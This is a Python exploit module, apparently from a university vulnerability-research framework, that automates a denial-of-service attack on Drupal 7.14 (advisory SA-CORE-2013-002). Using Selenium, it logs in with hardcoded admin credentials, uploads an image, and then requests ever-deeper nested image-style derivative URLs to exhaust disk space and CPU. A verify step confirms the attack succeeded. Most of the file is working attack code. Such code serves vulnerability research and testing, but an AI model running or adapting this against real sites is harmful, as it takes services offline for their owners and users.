
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.

import sys
import time
from selenium.common.exceptions import NoSuchElementException
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "DRUPAL_DP0002",
                  'Description' : "Drupal 7.X (Core) DOS Vulnerability\n" \
                                  "Drupal core's Image module allows for the on-demand generation" \
                                  "of image derivatives. This capability can be abused by "        \
                                  "requesting a large number of new derivatives which can fill up" \
                                  " the server disk space, and which can cause a very high CPU "   \
                                  "load. Either of these effects may lead to the site becoming "   \
                                  "unavailable or unresponsive.",
                  'References' :  [['SA-CORE','2013-002']],
                  'Target' :      "Drupal 7.14",
                  'Type' : 'DOS'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.files_to_generate = 100
        return
            
    def setup(self, system_dir):

        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/drupal")
        driver.get_element(by_xpath="//input[@id='edit-name']").send_keys("drupaladmin")
        driver.get_element(by_xpath="//input[@id='edit-pass']").send_keys("drupaladminpw21")
        driver.get_element(by_xpath="//input[@id='edit-submit']").click()
     
                                                   
        driver.get_element(by_link_text="Add new content").click()
        driver.get("http://127.0.0.1/drupal/?q=node%2Fadd%2Farticle&")
        
        driver.get_element(by_xpath="//input[@id='edit-title']").send_keys("Demo Article")
        # upload an image from the drupal installation
        driver.get_element(by_xpath="//input[@id='edit-field-image-und-0-upload']").send_keys(system_dir + "/var/www/drupal/misc/message-24-warning.png")
        driver.get_element(by_xpath="//input[@id='edit-field-image-und-0-upload-button']").click()
        driver.get_element(by_xpath="//input[@id='edit-submit']").click()
        driver.cleanup()
        return

    def exploit(self):
        driver = self.create_selenium_driver()
        self.logger.info("Creating nested directories and image files %s times" %(self.files_to_generate,))
        
        base_path = "http://127.0.0.1/drupal/?q=sites/default/files/"
        rep = "styles/medium/public/"
        end_path = "field/image/message-24-warning_0.png"

        for i in range(1, self.files_to_generate+1):
            driver.get(base_path + (rep*i) + end_path)

            if not (i%10):
                self.logger.info("created 10 images")

        self.logger.info("see /var/www/drupal/sites/default/files/ for the many nested folders and images that were just created")

        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return


    def verify(self):
        driver = self.create_selenium_driver()        
        verified = False
        driver.get("http://127.0.0.1/drupal/sites/default/files/styles/")

        try:
            driver.get_element(by_xpath="//a[@href='medium/']")
            self.logger.info("Verified file creation")
            verified = True
        except NoSuchElementException:
            self.logger.error("Unable to verify DOS")

        driver.cleanup()
        return verified
